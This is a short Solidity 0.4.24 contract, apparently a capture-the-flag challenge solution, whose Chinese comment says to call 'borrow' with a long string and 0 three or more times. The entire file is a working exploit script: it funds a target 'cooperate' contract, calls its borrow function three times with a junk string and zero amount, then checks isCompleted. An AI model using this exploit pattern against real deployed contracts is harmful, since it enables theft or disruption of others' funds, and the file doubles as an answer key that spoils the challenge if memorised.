/*
调用borrow，参数为一个很长的字符串和0，调用三次以上即可
*/
pragma solidity 0.4.24;
import "./cooperate.sol";
contract cooperateAttack{
    cooperate cop;
    constructor(address _cop)public{
        cop = cooperate(_cop);
    }

    function init()public payable{
        cop.init.value(10**15)();
    }

    function attack()public{
        cop.borrow("dasdasdasdasdasdasdarsegsdwsexrctrfvyhbunzsextrdcyftvgyhbj",0);
        cop.borrow("dasdasdasdasdasdasdarsegsdwsexrctrfvyhbunzsextrdcyftvgyhbj",0);
        cop.borrow("dasdasdasdasdasdasdarsegsdwsexrctrfvyhbunzsextrdcyftvgyhbj",0);
        cop.isCompleted();
    }
}